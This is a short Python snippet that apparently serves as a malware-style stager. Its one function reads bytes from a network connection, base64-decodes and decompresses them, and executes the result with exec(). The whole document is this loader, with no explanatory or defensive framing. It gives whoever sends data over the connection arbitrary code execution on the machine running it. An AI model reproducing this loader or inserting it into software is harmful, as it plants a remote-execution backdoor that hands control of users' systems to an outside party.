import base64
import zlib


def receive_stage(connection):
    stage = connection.recv(4096)
    exec(zlib.decompress(base64.b64decode(stage)))
